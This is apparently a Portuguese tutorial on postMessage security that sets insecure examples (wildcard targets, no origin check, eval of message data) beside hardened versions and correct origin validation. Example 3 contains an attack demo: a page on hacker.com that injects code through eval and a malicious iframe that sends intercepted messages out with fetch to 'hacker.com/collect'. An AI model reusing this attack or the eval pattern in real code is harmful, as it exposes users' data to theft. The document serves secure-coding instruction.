# Code Examples: Web Messaging API — Seguranca

## Exemplo 1: Comunicacao basica pai → filho (INSEGURO)

### Parent Window (index.html)
```html
<!DOCTYPE html>
<html>
<body>
  <h1>Parent Window</h1>
  <button onclick="send()">Send</button>
  <iframe src="https://chat.meusite.com/iframe.html"></iframe>

  <script>
    function send() {
      const iframe = document.querySelector('iframe')
      // PROBLEMA: asterisco envia para qualquer destino
      iframe.contentWindow.postMessage('callback', '*')
    }
  </script>
</body>
</html>
```

### Child Window (iframe.html)
```html
<!DOCTYPE html>
<html>
<body>
  <h1>Child Window</h1>
  <p>Counter: <span id="counter">0</span></p>

  <script>
    window.addEventListener('message', function(event) {
      // PROBLEMA: nao valida origem — aceita de qualquer remetente
      const counter = document.querySelector('#counter')
      counter.textContent = parseFloat(counter.textContent) + 1
    })
  </script>
</body>
</html>
```

## Exemplo 2: Comunicacao filho → pai com eval (MUITO INSEGURO)

### Parent Window recebendo mensagens
```html
<script>
  function add() {
    const counter = document.querySelector('#counter')
    counter.textContent = parseFloat(counter.textContent) + 1
  }

  function remove() {
    const counter = document.querySelector('#counter')
    counter.textContent = parseFloat(counter.textContent) - 1
  }

  window.addEventListener('message', function(event) {
    // PERIGO CRITICO: eval executa qualquer codigo recebido
    eval(event.data)
  })
</script>
```

### Child Window enviando comandos
```html
<script>
  function send(message) {
    // Envia 'add()' ou 'remove()' como string para eval
    parent.postMessage(message, '*')
  }
</script>
<button onclick="send('add()')">+1</button>
<button onclick="send('remove()')">-1</button>
```

## Exemplo 3: Ataque do hacker

### Pagina do atacante (hacker1.html em hacker.com)
```html
<!DOCTYPE html>
<html>
<body style="background: black; color: red;">
  <h1>Hacker Window</h1>
  <button onclick="hack()">Hack</button>

  <!-- Carrega a aplicacao vitima em iframe -->
  <iframe src="https://meusite.com/index.html"
          style="width: 100vw; height: 100vh; position: absolute; top: 0; left: 0;">
  </iframe>

  <script>
    function send(msg) {
      const iframe = document.querySelector('iframe')
      iframe.contentWindow.postMessage(msg, '*')
    }

    function hack() {
      // Injeta iframe malicioso dentro da aplicacao vitima via eval
      send(`
        var i = document.createElement('iframe');
        i.src = 'https://hacker.com/hacker2.html';
        document.querySelector('p').after(i);
      `)
    }

    // Executa o hack automaticamente apos 1 segundo
    setTimeout(hack, 1000)
  </script>
</body>
</html>
```

### Iframe malicioso (hacker2.html)
```html
<!DOCTYPE html>
<html>
<body>
  <h1>Hacker Window</h1>
  <p>Counter: <span id="counter">0</span></p>

  <script>
    // Recebe todas as mensagens destinadas ao iframe legitimo
    window.addEventListener('message', function(event) {
      const counter = document.querySelector('#counter')
      counter.textContent = parseFloat(counter.textContent) + 1

      // Exfiltra dados para servidor do atacante
      fetch('https://hacker.com/collect', {
        method: 'POST',
        body: JSON.stringify({ data: event.data, origin: event.origin })
      })
    })
  </script>
</body>
</html>
```

## Exemplo 4: Versao SEGURA completa

### Parent Window (segura)
```html
<!DOCTYPE html>
<html>
<body>
  <h1>Parent Window</h1>
  <button onclick="send()">Send</button>
  <p>Counter: <span id="counter">0</span></p>
  <iframe src="https://chat.meusite.com/iframe.html"></iframe>

  <script>
    const ALLOWED_ORIGINS = [
      'https://meusite.com',
      'https://chat.meusite.com'
    ]

    function send() {
      const iframe = document.querySelector('iframe')
      // Especifica destino exato
      iframe.contentWindow.postMessage('callback', 'https://chat.meusite.com')
    }

    function add() {
      const counter = document.querySelector('#counter')
      counter.textContent = parseFloat(counter.textContent) + 1
    }

    function remove() {
      const counter = document.querySelector('#counter')
      counter.textContent = parseFloat(counter.textContent) - 1
    }

    window.addEventListener('message', function(event) {
      // Valida origem com whitelist exata
      if (!ALLOWED_ORIGINS.includes(event.origin)) {
        console.warn('Origem rejeitada:', event.origin)
        return
      }

      // Aceita apenas acoes conhecidas — nunca eval
      switch (event.data) {
        case 'add':
          add()
          break
        case 'remove':
          remove()
          break
        default:
          console.warn('Mensagem desconhecida:', event.data)
      }
    })
  </script>
</body>
</html>
```

### Child Window (segura)
```html
<!DOCTYPE html>
<html>
<body>
  <h1>Child Window</h1>
  <p>Counter: <span id="counter">0</span></p>
  <button onclick="send('add')">+1</button>
  <button onclick="send('remove')">-1</button>

  <script>
    const ALLOWED_ORIGINS = ['https://meusite.com']

    function send(action) {
      // Envia string simples, nao codigo executavel
      parent.postMessage(action, 'https://meusite.com')
    }

    window.addEventListener('message', function(event) {
      if (!ALLOWED_ORIGINS.includes(event.origin)) return

      const counter = document.querySelector('#counter')
      counter.textContent = parseFloat(counter.textContent) + 1
    })
  </script>
</body>
</html>
```

## Exemplo 5: Validacao ERRADA vs CORRETA de origem

### ERRADO — includes (bypass com subdominio)
```typescript
// hacker registra: meusite.com.hacker.com
// event.origin = 'https://meusite.com.hacker.com'
if (event.origin.includes('meusite.com')) {
  // PASSA! O atacante enganou a validacao
}
```

### ERRADO — endsWith sem ponto (bypass com dominio similar)
```typescript
// hacker registra: hackermeusite.com
// event.origin = 'https://hackermeusite.com'
if (event.origin.endsWith('meusite.com')) {
  // PASSA! Faltou o ponto antes
}
```

### CORRETO — whitelist exata
```typescript
const ALLOWED = ['https://meusite.com', 'https://chat.meusite.com']
if (!ALLOWED.includes(event.origin)) return
```

### CORRETO — regex com ponto obrigatorio
```typescript
const pattern = /^https:\/\/([a-z0-9-]+\.)*meusite\.com$/
if (!pattern.test(event.origin)) return
```